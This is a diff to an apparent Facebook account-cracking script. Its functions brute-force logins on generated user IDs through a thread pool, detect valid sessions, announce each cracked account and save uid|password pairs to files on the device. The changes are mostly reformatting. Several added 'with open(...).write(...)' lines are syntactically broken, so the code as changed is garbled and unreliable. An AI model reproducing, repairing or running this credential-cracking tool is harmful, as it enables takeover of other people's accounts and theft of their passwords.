@@ -782,13 +782,9 @@ def MIX_CLONING():
         for mal in user:
             uid=year_code+mal
             jihad.submit(login3,uid)
-    line()
-    print(f'\r\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;46m!')
-    linex()
-    print(f'\r\r\r\r\33[38;5;46m[\033[1;97mᯤ\33[38;5;46m] \033[1;97mTOTAL OK \33[38;5;46m▶ \x1b[38;5;46m{len(oks)}')
-    linex()
-    input(f'\33[38;5;46m[\033[1;97mᯤ\33[38;5;46m] \033[1;97mINTER TO BACK RAN AGAIN...\33[38;5;46m!\033[1;37m')
-    main()
+    line();print(f'\r\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;46m!');linex();print(f'\r\r\r\r\33[38;5;46m[\033[1;97mᯤ\33[38;5;46m] \033[1;97mTOTAL OK \33[38;5;46m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;46m[\033[1;97mᯤ\33[38;5;46m] \033[1;97mINTER TO BACK RAN AGAIN...\33[38;5;46m!\033[1;37m');main()
+
+    
 def RANDOM_CLONING():
     user=[]
     clear()
@@ -879,13 +875,13 @@ def login1(uid):
 
             elif "www.facebook.com" in rp['error']['message']:
                 print(f'\r\r\r\r\r\033[1;97m[\x1b[38;5;46mSUCCESFUL\033[1;97m] \x1b[38;5;46m{uid} \033[1;97m=\x1b[38;5;46m{pw}\033[1;97m')
-                open("/sdcard/BRUTE_CLONING-OK.txt", "a").write(uid + "|" + pw + "\n")
+                with open("/sdcard/BRUTE_CLONING-OK.txt", "a").write(uid + "|" + pw + "\n")
                 cps.append(uid)
                 break
             else:
                 continue
         loop += 1
-    except Exception as e:
+    except Exception:
         time.sleep(random.uniform(5, 10))
 
 def login2(uid):
@@ -947,7 +943,7 @@ def login2(uid):
             if "session_key" in rp:
                 print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m')
                 os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/OLD_CLONING-OK.txt", "a").write(uid + "|" + pw + "\n")
+                with open("/sdcard/OLD_CLONING-OK.txt", "a").write(uid + "|" + pw + "\n")
                 oks.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
@@ -956,7 +952,7 @@ def login2(uid):
             else:
                 continue
         loop += 1
-    except Exception as e:
+    except Exception:
         time.sleep(random.uniform(5, 10))
 def login3(uid):
     global oks, loop, cps
@@ -1017,7 +1013,7 @@ def login3(uid):
             if "session_key" in rp:
                 print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m')
                 os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/MIX_CLONING-OK.txt", "a").write(uid + "|" + pw + "\n")
+                with open("/sdcard/MIX_CLONING-OK.txt", "a").write(uid + "|" + pw + "\n")
                 oks.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
@@ -1026,7 +1022,7 @@ def login3(uid):
             else:
                 continue
         loop += 1
-    except Exception as e:
+    except Exception:
         time.sleep(random.uniform(5, 10))
 
 def login4(uid):
@@ -1088,7 +1084,7 @@ def login4(uid):
             if "session_key" in rp:
                 print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m')
                 os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/RANDOM_CLONING-OK.txt", "a").write(uid + "|" + pw + "\n")
+                with open("/sdcard/RANDOM_CLONING-OK.txt", "a").write(uid + "|" + pw + "\n")
                 oks.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
@@ -1097,7 +1093,7 @@ def login4(uid):
             else:
                 continue
         loop += 1
-    except Exception as e:
+    except Exception:
         time.sleep(random.uniform(5, 10))
 if __name__ == "__main__":
 	show_loading()
